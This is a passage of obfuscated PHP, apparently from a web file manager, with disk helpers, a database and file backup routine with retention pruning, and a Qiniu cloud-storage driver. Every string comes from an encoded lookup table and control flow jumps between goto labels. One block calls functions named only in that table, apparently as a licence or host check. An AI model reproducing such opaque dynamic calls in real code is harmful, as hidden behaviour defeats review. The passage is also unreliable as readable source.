$œ‡“¦º‹[1404], $œ‡“¦º‹[1405], $œ‡“¦º‹[1406], $œ‡“¦º‹[1407]); foreach ($ßÕ•š¸ as $éşç½ö) { $‹°Äµ«ò = preg_split($œ‡“¦º‹[1408], $éşç½ö); $æê’¢ œ = $‹°Äµ«ò[count($‹°Äµ«ò) - 1]; if (!strstr($‹°Äµ«ò[0], $œ‡“¦º‹[1409]) || !$æê’¢ œ) { continue; } $“Ô³ûÕ€ = rtrim($æê’¢ œ, $œ‡“¦º‹[8]) . $œ‡“¦º‹[8]; if (in_array($“Ô³ûÕ€, $ëè£äƒ›)) { continue; } $¸ï¥ñ¥ù[] = $“Ô³ûÕ€; } return $¸ï¥ñ¥ù; } public static function isSameDisk($‰¥öšŸ¬, $ú×ààŒ) { $üú¢’ôª =& $_SERVER[«òÑğ]; if ($GLOBALS[$üú¢’ôª[6]][$üú¢’ôª[1395]] == $üú¢’ôª[1396]) { return strtolower(substr($‰¥öšŸ¬, 0, 1)) == strtolower(substr($ú×ààŒ, 0, 1)); } $ªÌí£Ñ‰ = stat($‰¥öšŸ¬); $«³ıÄ‹ = stat($ú×ààŒ); if ($ªÌí£Ñ‰ === !1 || $«³ıÄ‹ === !1) { return !1; } return $ªÌí£Ñ‰[$üú¢’ôª[1410]] === $«³ıÄ‹[$üú¢’ôª[1410]]; $—°¾î— = self::diskList(); $Šä´¾¡– = !1; $ƒ¶Ë€ûÇ = !1; sort($—°¾î—); $—°¾î— = array_reverse($—°¾î—); $‰¥öšŸ¬ = rtrim($‰¥öšŸ¬, $üú¢’ôª[8]) . $üú¢’ôª[8]; $ú×ààŒ = rtrim($ú×ààŒ, $üú¢’ôª[8]) . $üú¢’ôª[8]; foreach ($—°¾î— as $™¯•“ü±) { $É¬Òã¦º = strlen($™¯•“ü±); if (!$Šä´¾¡– && substr($‰¥öšŸ¬, 0, $É¬Òã¦º) == $™¯•“ü±) { $Šä´¾¡– = $™¯•“ü±; } if (!$ƒ¶Ë€ûÇ && substr($ú×ààŒ, 0, $É¬Òã¦º) == $™¯•“ü±) { $ƒ¶Ë€ûÇ = $™¯•“ü±; } if ($Šä´¾¡– && $ƒ¶Ë€ûÇ) { break; } } return $Šä´¾¡– === $ƒ¶Ë€ûÇ; } public static function transferType($ğ¾½ê­Ÿ, $‰Áµ²ÍÔ) { $××ø½Ù‚ =& $_SERVER[«òÑğ]; $¼‡³¬ = self::driverType($ğ¾½ê­Ÿ); $¬ÙßË = self::driverType($‰Áµ²ÍÔ); if ($¼‡³¬[$××ø½Ù‚[33]] == $¬ÙßË[$××ø½Ù‚[33]] && $¼‡³¬[$××ø½Ù‚[1411]] == $¬ÙßË[$××ø½Ù‚[1411]]) { return $××ø½Ù‚[1412]; } if ($¼‡³¬[$××ø½Ù‚[33]] == $××ø½Ù‚[959] && $¬ÙßË[$××ø½Ù‚[33]] == $××ø½Ù‚[109]) { return $××ø½Ù‚[1289]; } if ($¼‡³¬[$××ø½Ù‚[33]] == $××ø½Ù‚[109] && $¬ÙßË[$××ø½Ù‚[33]] == $××ø½Ù‚[959]) { return $××ø½Ù‚[110]; } return $××ø½Ù‚[1413]; } public static function driverType($ßÏ–Òïğ) { $Óó™³± =& $_SERVER[«òÑğ]; $®„¤ªû¤ = str_replace($Óó™³±[1414], $Óó™³±[12], strtolower($ßÏ–Òïğ->getType())); if ($®„¤ªû¤ == $Óó™³±[841] || $®„¤ªû¤ == $Óó™³±[1415] || $®„¤ªû¤ == $Óó™³±[1416]) { $ßÏ–Òïğ = self::defaultDriverInit(); } else { if ($®„¤ªû¤ == $Óó™³±[1299] || $®„¤ªû¤ == $Óó™³±[1417]) { $ßÏ–Òïğ = IO::init($ßÏ–Òïğ->pathParse[$Óó™³±[1242]]); } } $Ï ñ±·¶ = $ßÏ–Òïğ->path; $®„¤ªû¤ = str_replace($Óó™³±[1414], $Óó™³±[12], strtolower($ßÏ–Òïğ->getType())); if ($®„¤ªû¤ == $Óó™³±[109]) { return array($Óó™³±[33] => $Óó™³±[109], $Óó™³±[1411] => $Óó™³±[12], $Óó™³±[87] => $Ï ñ±·¶, $Óó™³±[98] => $ßÏ–Òïğ); } return array($Óó™³±[33] => $Óó™³±[959], $Óó™³±[1411] => $ßÏ–Òïğ->pathDriver, $Óó™³±[87] => $Ï ñ±·¶, $Óó™³±[98] => $ßÏ–Òïğ); } public static function pathDriverType($è¹ŸøÓœ) { return $è¹ŸøÓœ ? self::driverType(IO::init($è¹ŸøÓœ)) : !1; } public static function pathDriverLocal($ş˜³˜ñ) { $îÖğâ =& $_SERVER[«òÑğ]; $®íœòºÍ = $ş˜³˜ñ ? self::driverType(IO::init($ş˜³˜ñ)) : !1; return strtolower($®íœòºÍ[$îÖğâ[33]]) == $îÖğâ[109] ? !0 : !1; } public static function allowCover($‚“ú§ØÈ, $¸…ÅÔ‰ã = true) { $÷Îâ¾£õ =& $_SERVER[«òÑğ]; if (is_string($‚“ú§ØÈ)) { $‚“ú§ØÈ = IO::info($‚“ú§ØÈ); } if (!$‚“ú§ØÈ || $‚“ú§ØÈ[$÷Îâ¾£õ[33]] == $÷Îâ¾£õ[78] || $‚“ú§ØÈ[$÷Îâ¾£õ[79]] <= 100) { return !1; } if (isset($‚“ú§ØÈ[$÷Îâ¾£õ[1418]]) || !$‚“ú§ØÈ[$÷Îâ¾£õ[87]]) { return !1; } if (isset($‚“ú§ØÈ[$÷Îâ¾£õ[235]]) && !$‚“ú§ØÈ[$÷Îâ¾£õ[235]]) { return !1; } static $ùßÄÓõİ = false; if (!$ùßÄÓõİ || !$¸…ÅÔ‰ã) { $Á€åª‘ß = self::driverType(IO::init($‚“ú§ØÈ[$÷Îâ¾£õ[87]])); $¶ĞúÒ¡¤ = $Á€åª‘ß[$÷Îâ¾£õ[98]]; $ùßÄÓõİ = $÷Îâ¾£õ[197]; if ($Á€åª‘ß[$÷Îâ¾£õ[33]] == $÷Îâ¾£õ[109]) { $ùßÄÓõİ = $÷Îâ¾£õ[1419]; } if ($Á€åª‘ß[$÷Îâ¾£õ[98]] && is_array($Á€åª‘ß[$÷Îâ¾£õ[98]]->config)) { $üé¿ó¹“ = $Á€åª‘ß[$÷Îâ¾£õ[98]]->config; if (isset($üé¿ó¹“[$÷Îâ¾£õ[1420]]) && $üé¿ó¹“[$÷Îâ¾£õ[1420]]) { $ùßÄÓõİ = $÷Îâ¾£õ[1419]; } } $—ş‰Ú¹ƒ = KodIO::defaultDriver(); if (strtolower($—ş‰Ú¹ƒ[$÷Îâ¾£õ[98]]) == $÷Îâ¾£õ[109] && is_array($—ş‰Ú¹ƒ[$÷Îâ¾£õ[6]])) { $ª×‰£Ó¡ = $—ş‰Ú¹ƒ[$÷Îâ¾£õ[6]][$÷Îâ¾£õ[1272]]; if (substr($ª×‰£Ó¡, 0, 2) == $÷Îâ¾£õ[1421]) { $ª×‰£Ó¡ = str_replace($÷Îâ¾£õ[1421], BASIC_PATH, $ª×‰£Ó¡); } $ª×‰£Ó¡ = str_replace($÷Îâ¾£õ[257], $÷Îâ¾£õ[8], $ª×‰£Ó¡); if (substr($‚“ú§ØÈ[$÷Îâ¾£õ[87]], 0, strlen($ª×‰£Ó¡)) == $ª×‰£Ó¡) { $ùßÄÓõİ = $÷Îâ¾£õ[197]; } } } return $ùßÄÓõİ == $÷Îâ¾£õ[1419] ? !0 : !1; } } goto a¯Á—óõÇã; D©ª™‡ƒ»õ: if ($_SERVER[$_SERVER[«òÑğ][824]] != $_SERVER[$_SERVER[«òÑğ][825]]) { $_getc = $_SERVER[«òÑğ][826]; $_getfile = $_SERVER[$_SERVER[«òÑğ][827]] . $_SERVER[«òÑğ][828]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[«òÑğ][288], $_getfilec); if (count($_getarrs) < $_SERVER[«òÑğ][706]) { $exit = $_SERVER[«òÑğ][829]; $exit(); } $_act = $_SERVER[«òÑğ][830]; $_act($_SERVER[$_SERVER[«òÑğ][831]]); } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[«òÑğ][832]); $this->init(); $this->keep(); } public function init() { $±úÛ×Ë¤ =& $_SERVER[«òÑğ]; $this->isManual(); self::$name = date($±úÛ×Ë¤[833]); if (!($‘Á…‰ÅÄ = $this->model->lastItem())) { $‘Á…‰ÅÄ = $this->initData(); } else { self::$name = $‘Á…‰ÅÄ[$±úÛ×Ë¤[32]]; if ($‘Á…‰ÅÄ[$±úÛ×Ë¤[834]] == $±úÛ×Ë¤[91]) { self::$name = date($±úÛ×Ë¤[262]); $ÙÖ²Á¡¼ = intval(_get($‘Á…‰ÅÄ, $±úÛ×Ë¤[835], 0)); if (self::$manual == 0 && $‘Á…‰ÅÄ[$±úÛ×Ë¤[32]] == self::$name) { $this->model->remove($‘Á…‰ÅÄ[$±úÛ×Ë¤[478]]); } $‘Á…‰ÅÄ = $this->initData($ÙÖ²Á¡¼, $‘Á…‰ÅÄ[$±úÛ×Ë¤[836]]); } else { $this->checkStore($‘Á…‰ÅÄ[$±úÛ×Ë¤[836]]); } } self::$option = $‘Á…‰ÅÄ; } private function isManual() { $×¤Îäï¸ = _get($GLOBALS, $_SERVER[«òÑğ][837], 0); $×¤Îäï¸ = intval($×¤Îäï¸); self::$manual = $×¤Îäï¸ && $×¤Îäï¸ == 1 ? 1 : 0; } private function initData($àì´Ù­§ = 0, $¢ÚüüË = '') { $Â¹Œ‰í™ =& $_SERVER[«òÑğ]; $ìÜ©˜˜Ì = $this->model->config(); if ($¢ÚüüË && $ìÜ©˜˜Ì[$Â¹Œ‰í™[836]] != $¢ÚüüË) { $àì´Ù­§ = 0; } $this->checkStore($ìÜ©˜˜Ì[$Â¹Œ‰í™[836]]); if (self::$manual == 1) { self::$name .= $Â¹Œ‰í™[11] . date($Â¹Œ‰í™[838]); } $á‰¹‹»à = array($Â¹Œ‰í™[836] => $ìÜ©˜˜Ì[$Â¹Œ‰í™[836]], $Â¹Œ‰í™[32] => self::$name, $Â¹Œ‰í™[834] => 0, $Â¹Œ‰í™[171] => $ìÜ©˜˜Ì[$Â¹Œ‰í™[171]], $Â¹Œ‰í™[839] => self::$manual, $Â¹Œ‰í™[371] => array($Â¹Œ‰í™[840] => array($Â¹Œ‰í™[834] => 0), $Â¹Œ‰í™[841] => array($Â¹Œ‰í™[834] => 0, $Â¹Œ‰í™[842] => 0, $Â¹Œ‰í™[843] => 0, $Â¹Œ‰í™[33] => $Â¹Œ‰í™[12], $Â¹Œ‰í™[844] => 0, $Â¹Œ‰í™[845] => 0), $Â¹Œ‰í™[846] => array($Â¹Œ‰í™[834] => 0, $Â¹Œ‰í™[842] => 0, $Â¹Œ‰í™[843] => 0, $Â¹Œ‰í™[844] => 0, $Â¹Œ‰í™[845] => 0), $Â¹Œ‰í™[233] => array($Â¹Œ‰í™[834] => 0, $Â¹Œ‰í™[847] => 0, $Â¹Œ‰í™[848] => 0, $Â¹Œ‰í™[849] => 0, $Â¹Œ‰í™[850] => 0, $Â¹Œ‰í™[546] => $àì´Ù­§, $Â¹Œ‰í™[844] => 0, $Â¹Œ‰í™[845] => 0)), $Â¹Œ‰í™[844] => time(), $Â¹Œ‰í™[845] => 0); $‹…äŒñß = $this->model->insert($á‰¹‹»à); $á‰¹‹»à[$Â¹Œ‰í™[478]] = $‹…äŒñß; return $á‰¹‹»à; } private function checkStore($©šÄëÉ·) { $©§ŸÃ”£ = Model($_SERVER[«òÑğ][851]); $Î¹‹õõÏ = $©§ŸÃ”£->listData($©šÄëÉ·); $©§ŸÃ”£->checkConfig($Î¹‹õõÏ); } public static function get() { if (!self::$option) { $ÕË¤ã€ˆ = Model($_SERVER[«òÑğ][832]); $ñùÂÆäš = $ÕË¤ã€ˆ->findByName(self::$name); $ÕË¤ã€ˆ->parseContent($ñùÂÆäš); self::$option = $ñùÂÆäš; } return self::$option; } public static function set($©Ò¿–€À) { $Œ­ä„§º =& $_SERVER[«òÑğ]; $Å³è¦ÆÂ = self::get(); foreach ($©Ò¿–€À as $×µà†Î¿ => $´•™À„) { array_set_value($Å³è¦ÆÂ, $×µà†Î¿, $´•™À„); } Model($Œ­ä„§º[832])->update($Å³è¦ÆÂ[$Œ­ä„§º[478]], $Å³è¦ÆÂ); self::$option = $Å³è¦ÆÂ; return self::$option; } public function keep() { $²ÓïÑÃ¨ =& $_SERVER[«òÑğ]; $‡®ê ¿ = self::get(); if (_get($‡®ê ¿, $²ÓïÑÃ¨[852], 0) == $²ÓïÑÃ¨[91]) { return; } $this->backupKeep($‡®ê ¿); self::set(array($²ÓïÑÃ¨[852] => 1)); } private function backupKeep($™Üîâ·) { $Ñ‹ÎÓ› =& $_SERVER[«òÑğ]; if (self::$manual == 1) { return; } $®…Ä’Ãé = $this->model->listData(); if (empty($®…Ä’Ãé)) { return; } $À‰—•õ = 0; $“£¯·à¶ = array(); foreach ($®…Ä’Ãé as $ËƒØóÊ) { if ($À‰—•õ >= 7) { break; } $“£¯·à¶[] = $ËƒØóÊ[$Ñ‹ÎÓ›[32]]; $À‰—•õ++; } for ($À‰—•õ = 0; $À‰—•õ < 12; $À‰—•õ++) { $“£¯·à¶[] = date($Ñ‹ÎÓ›[853], strtotime("\55{$À‰—•õ}\40\155\157\x6e\x74\x68\x73")); } $“£¯·à¶ = array_unique($“£¯·à¶); $“¿í’™« = Model($Ñ‹ÎÓ›[854])->get($Ñ‹ÎÓ›[855]); foreach ($®…Ä’Ãé as $ËƒØóÊ) { if (isset($ËƒØóÊ[$Ñ‹ÎÓ›[839]]) && $ËƒØóÊ[$Ñ‹ÎÓ›[839]] == $Ñ‹ÎÓ›[91]) { continue; } if (!empty($ËƒØóÊ[$Ñ‹ÎÓ›[32]]) && in_array($ËƒØóÊ[$Ñ‹ÎÓ›[32]], $“£¯·à¶)) { continue; } $this->model->remove($ËƒØóÊ[$Ñ‹ÎÓ›[478]]); $İ¡‹¥ë = $this->backupPath($™Üîâ·, $“¿í’™«); IO::remove($İ¡‹¥ë, !1); } } private function backupPath($º×‡÷ı÷, $¹õŒÜ‘Å = false) { $Á´Å½áÆ =& $_SERVER[«òÑğ]; if (!$¹õŒÜ‘Å) { $¹õŒÜ‘Å = Model($Á´Å½áÆ[854])->get($Á´Å½áÆ[855]); } $Í½¯¸ = $º×‡÷ı÷[$Á´Å½áÆ[32]]; $æİùƒ¥õ = substr(md5($Á´Å½áÆ[856] . $¹õŒÜ‘Å . $Í½¯¸), 0, 8); return "\173\151\157\x3a{$º×‡÷ı÷[$Á´Å½áÆ[836]]}\x7d\57\144\x61\164\141\x62\141\163\145\57\142\141\143\x6b\x75\160\57" . $Í½¯¸ . $Á´Å½áÆ[11] . $æİùƒ¥õ; } public function db() { $é™ÙÁ®” =& $_SERVER[«òÑğ]; $¥Ï…ºÉß = self::get(); if (_get($¥Ï…ºÉß, $é™ÙÁ®”[857], 0) == $é™ÙÁ®”[91]) { return !0; } $²€€É” = new BackupDb(); if (!$²€€É”->index()) { return !1; } self::set(array($é™ÙÁ®”[857] => 1)); return !0; } public function dbFile() { $ö†ïÀäï =& $_SERVER[«òÑğ]; $ĞİÖéı = self::get(); if (_get($ĞİÖéı, $ö†ïÀäï[858], 0) == $ö†ïÀäï[91]) { return !0; } $ìæüÏÅì = new BackupDbFile(); if (!$ìæüÏÅì->index()) { return !1; } self::set(array($ö†ïÀäï[858] => 1)); return !0; } public function file() { $ŠÖ™®ŒŒ =& $_SERVER[«òÑğ]; $èâÅ¾Ÿ§ = self::get(); if (_get($èâÅ¾Ÿ§, $ŠÖ™®ŒŒ[859], 0) == $ŠÖ™®ŒŒ[91]) { return !0; } if ($èâÅ¾Ÿ§[$ŠÖ™®ŒŒ[171]] == $ŠÖ™®ŒŒ[860]) { $Ï’É¨¾• = new BackupFile(); if (!$Ï’É¨¾•->index()) { return !1; } } self::set(array($ŠÖ™®ŒŒ[859] => 1, $ŠÖ™®ŒŒ[834] => 1)); return !0; } public static function log($¥ÖüùÜ€) { write_log($¥ÖüùÜ€, $_SERVER[«òÑğ][861]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Å®°åÕó =& $_SERVER[«òÑğ]; $ïÓ‘’¼ = Backup::get(); self::$io = $ïÓ‘’¼[$Å®°åÕó[836]]; self::$name = $ïÓ‘’¼[$Å®°åÕó[32]]; $Á¸‹×‡Ç = new DbManage(); $‘ôµÕƒ = $Á¸‹×‡Ç->dbType(); $†áçı = array($Å®°åÕó[862] => $‘ôµÕƒ, $Å®°åÕó[863] => time()); Backup::set($†áçı); $«úÛû… = $this->tmpFilesPath() . $Å®°åÕó[864] . self::$name . $Å®°åÕó[8]; del_dir($«úÛû…); mk_dir($«úÛû…); $ŠÒÙí£ = $ØõªËÍÆ = 0; try { $ÓÇ¹üü„ = $Á¸‹×‡Ç->db()->getTables(); } catch (Exception $ÇÃäÍŠƒ) { Backup::log($Å®°åÕó[865] . $ÇÃäÍŠƒ->getMessage()); return !1; } $ÓÇ¹üü„ = array_diff($ÓÇ¹üü„, array($Å®°åÕó[866], $Å®°åÕó[867])); foreach ($ÓÇ¹üü„ as $ÚèÜ¢ş¿) { if ($ÚèÜ¢ş¿ == $Å®°åÕó[868]) { continue; } $ŠÒÙí£ += $Á¸‹×‡Ç->model($ÚèÜ¢ş¿)->count(); } $ãø†Á˜¶ = new Task($Å®°åÕó[869], $Å®°åÕó[861], $ŠÒÙí£, LNG($Å®°åÕó[870]) . $Å®°åÕó[871] . LNG($Å®°åÕó[872])); $GLOBALS[$Å®°åÕó[873]] = self::$name; foreach ($ÓÇ¹üü„ as $ÚèÜ¢ş¿) { $®ƒÊÁúŸ = $«úÛû… . $ÚèÜ¢ş¿ . $Å®°åÕó[874]; if ($ÚèÜ¢ş¿ == $Å®°åÕó[868]) { @touch($®ƒÊÁúŸ); continue; } $ŠĞ…È¿ı = null; if ($ÚèÜ¢ş¿ == $Å®°åÕó[875] && $ïÓ‘’¼[$Å®°åÕó[171]] == $Å®°åÕó[860]) { $ŠĞ…È¿ı = self::$io; } $ØõªËÍÆ += $Á¸‹×‡Ç->sqlFromDb($ÚèÜ¢ş¿, $®ƒÊÁúŸ, $ãø†Á˜¶, $ŠĞ…È¿ı); } unset($GLOBALS[$Å®°åÕó[873]]); $ãø†Á˜¶->end(); if ($ØõªËÍÆ > $ŠÒÙí£) { $ŠÒÙí£ = $ØõªËÍÆ; } $†áçı = array($Å®°åÕó[862] => $‘ôµÕƒ, $Å®°åÕó[857] => 1, $Å®°åÕó[876] => $ŠÒÙí£, $Å®°åÕó[877] => $ØõªËÍÆ, $Å®°åÕó[878] => time()); Backup::set($†áçı); if ($ŠÒÙí£ - $ØõªËÍÆ > 0) { $í÷ªÖ‹ = $Å®°åÕó[879]; if (!stristr(I18n::getType(), $Å®°åÕó[880])) { $í÷ªÖ‹ = $Å®°åÕó[881]; } Backup::log(array($í÷ªÖ‹, $†áçı)); return !1; } return !0; } private function tmpFilesPath() { $Â¥’€• =& $_SERVER[«òÑğ]; $¼íú…Öñ = TEMP_FILES; if ($GLOBALS[$Â¥’€•[6]][$Â¥’€•[92]][$Â¥’€•[882]]) { $¼íú…Öñ = $GLOBALS[$Â¥’€•[6]][$Â¥’€•[92]][$Â¥’€•[882]]; if (!mk_dir($¼íú…Öñ) || !is_writable($¼íú…Öñ) || !IO::mkfile($¼íú…Öñ . $Â¥’€•[883])) { $¼íú…Öñ = TEMP_FILES; } } return $¼íú…Öñ; } } goto Dª‡ˆ‹è»ï; FµéèñªªŠ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($õ¸‰ôÅî) { parent::__construct(); require_once SDK_DIR . $_SERVER[«òÑğ][1540]; $this->_init($õ¸‰ôÅî); } public function _init($åñïß™ö) { $®ÀÓ²ğ´ =& $_SERVER[«òÑğ]; $this->config = $åñïß™ö; foreach ($åñïß™ö as $ÁÂÜ×ª“ => $•¯²Æö¯) { if (isset($this->{$ÁÂÜ×ª“})) { $this->{$ÁÂÜ×ª“} = $•¯²Æö¯; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($®ÀÓ²ğ´[1541] . LNG($®ÀÓ²ğ´[1476])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($˜²Ò¾Õå, $šÕôğ—“ = '', $€¤‰¨¼– = REPEAT_RENAME) { if ($this->setContent($˜²Ò¾Õå, $šÕôğ—“)) { return $this->getPathOuter($˜²Ò¾Õå); } return !1; } public function mkdir($¸ı‘†ºÃ, $åûŞÀÒ = REPEAT_SKIP) { $¼ğéŞáÀ =& $_SERVER[«òÑğ]; $À“ûÚŞü = trim($¸ı‘†ºÃ, $¼ğéŞáÀ[8]); if ($this->_isFolder($À“ûÚŞü)) { return $this->getPathOuter($À“ûÚŞü); } $¸ı‘†ºÃ = $À“ûÚŞü . $¼ğéŞáÀ[8]; $’´µ– œ = get_path_this($À“ûÚŞü); $Ò«Ş¶· = $¸ı‘†ºÃ . $’´µ– œ; if (!$this->mkfile($Ò«Ş¶·)) { return !1; } if (!$this->moveFile($Ò«Ş¶·, $¸ı‘†ºÃ)) { $this->delFile($Ò«Ş¶·); return !1; } return $this->getPathOuter($À“ûÚŞü); } public function copyFile($§šó‚Ò’, $¨¶Şâ˜ğ) { $¡¸ÈîË = $this->bucketManager->copy($this->bucket, $§šó‚Ò’, $this->bucket, $¨¶Şâ˜ğ, !0); return $¡¸ÈîË ? !1 : $this->getPathOuter($¨¶Şâ˜ğ); } public function moveFile($ç¦âçæ¬, $ÌÎˆùÅï) { $ğú‰® = $this->bucketManager->move($this->bucket, $ç¦âçæ¬, $this->bucket, $ÌÎˆùÅï, !0); return $ğú‰® ? !1 : $this->getPathOuter($ÌÎˆùÅï); } public function delFile($Ø‰¹öªñ) { if (!$this->exist($Ø‰¹öªñ)) { return !0; } $½Á¬”³ = $this->bucketManager->delete($this->bucket, $Ø‰¹öªñ); if (!$½Á¬”³) { return !0; } return $½Á¬”³->code() == 612 ? !0 : !1; } public function delFolder($›ÏÀ÷œ) { $³Õ»ˆÙ =& $_SERVER[«òÑğ]; if (!$this->exist($›ÏÀ÷œ)) { return !0; } $this->listItemCache = !1; $¡Í›äÕî = $this->fileList($›ÏÀ÷œ); $this->listItemCache = !0; $‘ªôêÁ = trim($›ÏÀ÷œ, $³Õ»ˆÙ[8]) . $³Õ»ˆÙ[8]; if (!empty($›ÏÀ÷œ) && $›ÏÀ÷œ !== $³Õ»ˆÙ[231] && !in_array($‘ªôêÁ, $¡Í›äÕî[$³Õ»ˆÙ[85]])) { $¡Í›äÕî[$³Õ»ˆÙ[85]][] = $‘ªôêÁ; } $×Âø¾ÀÍ = $this->delByBatch($¡Í›äÕî[$³Õ»ˆÙ[86]]); if (!$×Âø¾ÀÍ) { return !1; } $×Âø¾ÀÍ = $this->delByBatch($¡Í›äÕî[$³Õ»ˆÙ[85]]); if (!$×Âø¾ÀÍ) { return !1; } return $this->delFile($‘ªôêÁ); } private function delByBatch($ê¯¶úÏ) { foreach (array_chunk($ê¯¶úÏ, 1000) as $¸ƒÊ¨Åç) { $¡¨İ¥ú­ = $this->bucketManager->buildBatchDelete($this->bucket, $¸ƒÊ¨Åç); list($ã…·ÒäÄ, $­Ä„¼ñÑ) = $this->bucketManager->batch($¡¨İ¥ú­); if ($­Ä„¼ñÑ) { return !1; } } return !0; } public function rename($»˜¯¦¶î, $”ªÇ™‹é) { return $this->renameObject($»˜¯¦¶î, $”ªÇ™‹é); } public function fileInfo($É±Õğ‘, $°Ú¡î´· = false, $´ŞÚş»Å = array()) { $• å¨Ø² =& $_SERVER[«òÑğ]; $í­¹…†Ñ = array($• å¨Ø²[32] => $this->pathThis($É±Õğ‘), $• å¨Ø²[87] => $this->getPathOuter($• å¨Ø²[8] . $É±Õğ‘), $• å¨Ø²[33] => $• å¨Ø²[233], $• å¨Ø²[79] => isset($´ŞÚş»Å[$• å¨Ø²[1542]]) ? $´ŞÚş»Å[$• å¨Ø²[1542]] : 0, $• å¨Ø²[169] => $this->ext($É±Õğ‘)); if ($°Ú¡î´·) { return $í­¹…†Ñ; } $í­¹…†Ñ[$• å¨Ø²[234]] = $í­¹…†Ñ[$• å¨Ø²[88]] = 0; $í­¹…†Ñ[$• å¨Ø²[235]] = $í­¹…†Ñ[$• å¨Ø²[236]] = !0; if (empty($´ŞÚş»Å)) { $´ŞÚş»Å = $this->objectMeta($É±Õğ‘); if (!$´ŞÚş»Å) { return $í­¹…†Ñ; } } if (isset($´ŞÚş»Å[$• å¨Ø²[237]]) && $´ŞÚş»Å[$• å¨Ø²[237]]) { $í­¹…†Ñ[$• å¨Ø²[238]] = $´ŞÚş»Å[$• å¨Ø²[237]]; } if (isset($´ŞÚş»Å[$• å¨Ø²[248]]) && $´ŞÚş»Å[$• å¨Ø²[248]]) { $í­¹…†Ñ[$• å¨Ø²[238]] = $´ŞÚş»Å[$• å¨Ø²[248]]; } if (isset($´ŞÚş»Å[$• å¨Ø²[1543]])) { $í­¹…†Ñ[$• å¨Ø²[88]] = substr($´ŞÚş»Å[$• å¨Ø²[1543]] . $• å¨Ø²[12], 0, 10); } if (isset($´ŞÚş»Å[$• å¨Ø²[1542]])) { $í­¹…†Ñ[$• å¨Ø²[79]] = $´ŞÚş»Å[$• å¨Ø²[1542]]; } return $í­¹…†Ñ; } public function folderInfo($Ù„‰Ì«”, $ó•ìÍı® = false) { $±ÚäÇò  =& $_SERVER[«òÑğ]; $ø²œˆ = array($±ÚäÇò [32] => $this->pathThis($Ù„‰Ì«”), $±ÚäÇò [87] => $this->getPathOuter($±ÚäÇò [8] . $Ù„‰Ì«”), $±ÚäÇò [33] => $±ÚäÇò [78]); if ($ó•ìÍı®) { return $ø²œˆ; } $ø²œˆ[$±ÚäÇò [234]] = $ø²œˆ[$±ÚäÇò [88]] = 0; $ø²œˆ[$±ÚäÇò [235]] = $ø²œˆ[$±ÚäÇò [236]] = !0; $Ù„‰Ì«” = rtrim($Ù„‰Ì«”, $±ÚäÇò [8]) . $±ÚäÇò [8]; $Ï¾ú±ª» = $this->objectMeta($Ù„‰Ì«”); if (isset($Ï¾ú±ª»[$±ÚäÇò [1543]])) { $ø²œˆ[$±ÚäÇò [88]] = substr($Ï¾ú±ª»[$±ÚäÇò [1543]] . $±ÚäÇò [12], 0, 10); } return $ø²œˆ; } public function listPath($Ê¯¤­«¶, $ÎñªÂ = false) { $²•ô……¬ =& $_SERVER[«òÑğ]; $¥¿ğ­Ë€ = $this->fileList($Ê¯¤­«¶, $²•ô……¬[8], !0); foreach ($¥¿ğ­Ë€[$²•ô……¬[85]] as $û¾ıæã» => $’æšÂêœ) { $¥¿ğ­Ë€[$²•ô……¬[85]][$û¾ıæã»] = $this->folderInfo($’æšÂêœ, $ÎñªÂ); } foreach ($¥¿ğ­Ë€[$²•ô……¬[86]] as $û¾ıæã» => $’æšÂêœ) { $¥¿ğ­Ë€[$²•ô……¬[86]][$û¾ıæã»] = $this->fileInfo($’æšÂêœ[$²•ô……¬[97]], $ÎñªÂ, $’æšÂêœ); } return $¥¿ğ­Ë€; } public function has($üßôî–, $ÃÚ²íÕ = false, $š·ÇÏ = true) { $–äŸøùã =& $_SERVER[«òÑğ]; $üßôî– = trim($üßôî–, $–äŸøùã[8]); $ıÏ´¼ª = empty($üßôî–) && $üßôî– !== $–äŸøùã[231] ? $–äŸøùã[12] : $üßôî– . $–äŸøùã[8]; $íëÚ‚³á = $–äŸøùã[12]; $É—Äñ½ë = 500; $¯–Ñ©«– = $–äŸøùã[8]; $âŠ™ŒÉ‡ = $µ½û’®ò = 0; while (!0) { check_abort(); list($ÎÌ…ÃÙµ, $«ÕŞ’¥ù) = $this->bucketManager->listFiles($this->bucket, $ıÏ´¼ª, $íëÚ‚³á, $É—Äñ½ë, $¯–Ñ©«–); if ($«ÕŞ’¥ù) { break; } $íëÚ‚³á = array_key_exists($–äŸøùã[1488], $ÎÌ…ÃÙµ) ? $íëÚ‚³á = $ÎÌ…ÃÙµ[$–äŸøùã[1544]] : $–äŸøùã[12]; if ($ÃÚ²íÕ) { if (!empty($ÎÌ…ÃÙµ[$–äŸøùã[1545]])) { $âŠ™ŒÉ‡ += count($ÎÌ…ÃÙµ[$–äŸøùã[1545]]); } if (!empty($ÎÌ…ÃÙµ[$–äŸøùã[1546]])) { $µ½û’®ò += count($ÎÌ…ÃÙµ[$–äŸøùã[1546]]); } if ($íëÚ‚³á === $–äŸøùã[12]) { break; } continue; } if ($š·ÇÏ) { if (!empty($ÎÌ…ÃÙµ[$–äŸøùã[1545]])) { return !0; } } else { if (!empty($ÎÌ…ÃÙµ[$–äŸøùã[1546]])) { return !0; } } if ($íëÚ‚³á === $–äŸøùã[12]) { break; } } if ($ÃÚ²íÕ) { return array($–äŸøùã[242] => $âŠ™ŒÉ‡, $–äŸøùã[243] => $µ½û’®ò); } return !1; } public function listAll($Ô½î¡‹) { $’ë«êê =& $_SERVER[«òÑğ]; $”æ˜’œ = $this->fileList($Ô½î¡‹, $’ë«êê[12], !0); $óîì£€ï = array_to_keyvalue($”æ˜’œ[$’ë«êê[86]], $’ë«êê[32]); foreach ($”æ˜’œ[$’ë«êê[85]] as $•‰¤´÷ì) { if (is_string($•‰¤´÷ì)) { 